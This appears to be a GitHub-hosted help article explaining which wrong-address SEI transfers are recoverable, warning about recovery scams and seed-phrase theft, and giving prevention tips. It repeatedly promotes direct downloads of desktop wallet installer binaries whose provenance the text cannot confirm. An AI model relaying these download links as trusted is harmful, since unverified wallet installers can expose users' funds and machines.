![Sei Wallet](https://github.com/sei-chain/sei-wallet-staking/raw/main/assets/banner-article.png)

<h1 align="center">Sent SEI to the wrong address from Sei Wallet: what is recoverable</h1>

<p align="center">What is recoverable, what is not, and who genuinely cannot help.</p>

<p align="center">
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe"><img src="https://img.shields.io/badge/download-windows-a82731?style=for-the-badge&labelColor=201412&logo=windows&logoColor=white" alt="Download Sei Wallet for Windows" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg"><img src="https://img.shields.io/badge/download-macos-a82731?style=for-the-badge&labelColor=201412&logo=apple&logoColor=white" alt="Download Sei Wallet for macOS" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip"><img src="https://img.shields.io/badge/download-linux-a82731?style=for-the-badge&labelColor=201412&logo=linux&logoColor=white" alt="Download Sei Wallet for Linux" height="40"></a>
</p>

| Platform | Requirements | File |
|:--|:--|:--|
| 🪟 Windows | Windows 10 (1909) or later, 64-bit | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| 🍎 macOS | macOS 12 or later | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| 🐧 Linux | x64, Ubuntu 20.04 or later, or equivalent | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

All versions and checksums are on the [Sei Wallet v6.6.2 release page](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2).

> [!WARNING]
> Only download from this GitHub release page. Sei Wallet support never asks for a recovery phrase, and anyone who does is running a scam.

Almost nothing in this situation is recoverable, and the sooner that is said plainly the better: a confirmed transfer cannot be reversed by the wallet, the operator, the validators, or a court order served on a block explorer. There is no chargeback, no support desk with a reversal button, and no legitimate service that can pull funds back out of an address nobody controls.

But "wrong address" covers four different situations, and exactly one of them is usually fine. So before concluding the money is gone, identify which one you are in. If you are new to the app, [the wallet in this guide](https://github.com/sei-chain/sei-wallet-setup/blob/main/what-the-desktop-app-is-and-how-it-works.md) covers what it is and where its activity view lives.

## Case 1: the address is another account you control

The most common outcome, and the only genuinely recoverable one.

If you mistyped an address and it still resolved to a valid account — one of yours, or an account whose key you hold — the funds are simply sitting somewhere else. Open that account and they are there.

Two versions of this are worth checking before anything else:

- **Another account in the same wallet.** Adding accounts gives each its own address, and it is easy to paste the wrong one from your own history.
- **A different address form of an account you hold.** Sending to your own `sei1…` form while watching the `0x…` form looks like a loss and is not. The two forms are one account, associated on-chain, so the balance is there either way.

If the address belongs to you, nothing is broken. Transfer it back, or keep it there.

## Case 2: a valid address belonging to someone else

This is the case people mean when they ask whether it can be undone, and the answer is no.

Why there is no mechanism:

- **The transaction is final.** Once it is included in a block, the state change is permanent. There is no undo operation at the protocol level.
- **The recipient's key is the only authority.** Nobody else — not the wallet vendor, not the operator, not a validator — can sign for that account.
- **Support cannot reverse what it never controlled.** A self-custody wallet has no custody, which is the point, and also why there is no lever to pull.

What you can still do, honestly: contact the recipient if you know who they are, and ask. Exchanges sometimes return funds sent to a deposit address that belongs to their platform, minus a fee, if the deposit is credited to an account they can identify. That is a request, not a right, and it depends entirely on the recipient's willingness.

What does not exist: a service that recovers funds from an address you do not control. Anyone offering that is either charging you for nothing or collecting your seed phrase. If you have already been contacted by one, the second loss is now the bigger risk.

## Case 3: the wrong network or the wrong form

Funds sent to the right address on the wrong chain are not lost in the same way, but they are not where you are looking.

**Sent on a different network.** An address can exist on several chains, and a transfer sent on Ethereum to a Sei address — or the reverse — is recorded on the chain it was sent on. You need a wallet pointed at that chain to see it. The practical rule is the one from any withdrawal screen: the network label must match the address. If the coins came from another wallet, the address that wallet showed you is your reference — [moving from Compass](https://github.com/sei-chain/sei-wallet-setup/blob/main/move-coins-off-compass.md) is the worked example of that handover. The same logic applies to tokens: [USDC and other tokens](https://github.com/sei-chain/sei-wallet-staking/blob/main/usdc-and-other-tokens.md) are contract balances rather than native SEI, and a native transfer to a token contract is a different mistake with a different answer.

**Sent native SEI to a `sei1…` address.** If the address is a valid account, the funds are at that account; what you may lack is a wallet that signs for the Cosmos-side derivation. This is a visibility problem rather than a loss, and it is the same mechanism that makes a Ledger appear to show two addresses.

**Sent to a testnet address, or from testnet to mainnet.** Testnet SEI is a different asset on a different network (chain 1328 rather than 1329). A "missing" transfer between them is not recoverable because it was never a mainnet transfer. If the balance you sent was test tokens, nothing of value moved.

## The scams that arrive after the mistake

A wrong-address post in a public forum is a beacon. Within minutes you will be contacted by accounts offering recovery, often with the product's name and a plausible avatar. The pattern is consistent:

- they ask for the transaction hash, then for "verification" that turns out to be your seed phrase;
- they ask for an upfront fee, sometimes payable in SEI "to cover gas";
- they offer to install a tool, or to take remote control of your machine;
- they create urgency, because the "window" is closing.

None of this is real. A wrong-address transfer is unrecoverable by anyone, which means everyone offering to recover it is lying about the one thing that defines them.

The same rule covers "we found your funds" messages, transaction-lookup sites that ask you to connect a wallet, and anyone who says the fee is refundable. The pattern is the same every time, and it starts with the mistake you just made being public.

## Preventing the next one

Start with the hash: look it up on an explorer, confirm which chain it is on and compare the destination character by character before you conclude anything. The mistake itself is almost always procedural, not technical, so the fix is procedural too.

- **Send a test amount first** for any address you have not used before. One fee versus the whole balance — and [gas and fees](https://github.com/sei-chain/sei-wallet-staking/blob/main/gas-fees-and-fee-settings.md) explains what that fee actually is.
- **Match the first and last four characters** against the source. Clipboard substitution changes the middle, which is exactly the part nobody reads.
- **Read the recipient on the confirmation screen**, and on the hardware device if you use one. The device screen is the last place a substituted address becomes visible.
- **Keep a short address book** for the addresses you use repeatedly, and verify each entry once, carefully, when you add it.
- **Do not copy addresses from chat messages, screenshots or social posts**, however official they look.
- **Check the network label** before confirming, every time. Chain 1329 is mainnet; 1328 is testnet.

If a transfer has been broadcast but is not confirming, that is a different problem from a wrong address — [a transaction that never confirmed](https://github.com/sei-chain/sei-wallet-staking/blob/main/transaction-stuck-as-pending.md) may still be replaceable or may simply need time. A transaction that confirmed and reverted is different again, and [a failed transaction](https://github.com/sei-chain/sei-wallet-staking/blob/main/transaction-failed-what-to-check.md) covers what to check. The distinction matters: a pending transfer has not been finalised, so acting quickly can still change the outcome.

## Frequently asked questions

**Can I cancel a transfer I already sent?** No. Once it is confirmed, it is final. Before confirmation, a stuck transaction may sometimes be replaced with a higher fee, which is a different operation.

**Can the wallet company reverse it?** No. It holds no custody and cannot sign for another account.

**I sent SEI to an exchange's deposit address. Can they return it?** Sometimes, if the address belongs to their platform and they can identify the account. Open a ticket with the transaction hash and ask; it is a request rather than an entitlement.

**I sent to my own address on the wrong network. Is it gone?** Not necessarily. It is on the network you sent it to, and a wallet pointed at that network can see it.

**What if the address was a contract?** Unless the contract has a function that returns funds, it is stuck. There is no general recovery path.

**Is there a recovery service that works?** No. Anyone claiming otherwise is running a scam, and the ones that ask for a seed phrase take everything rather than the amount you sent.

**What should I do first?** Get the hash, check it on an explorer, and confirm whether the destination is your own account. Most cases resolve there.

## Download Sei Wallet

| Platform | Installer |
|:--|:--|
| 🪟 Windows | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| 🍎 macOS | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| 🐧 Linux | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

Every file above is attached to the [Sei Wallet v6.6.2 release](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2), where the SHA-256 values are published. Verify the download before you run it.

## Related articles

- [What Sei Wallet is and how a desktop Sei wallet works](https://github.com/sei-chain/sei-wallet-setup/blob/main/what-the-desktop-app-is-and-how-it-works.md)
- [Moving SEI off Compass to Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/blob/main/move-coins-off-compass.md)
- [USDC and other tokens in Sei Wallet](https://github.com/sei-chain/sei-wallet-staking/blob/main/usdc-and-other-tokens.md)
- [Sei gas fees and what Sei Wallet shows before you sign](https://github.com/sei-chain/sei-wallet-staking/blob/main/gas-fees-and-fee-settings.md)
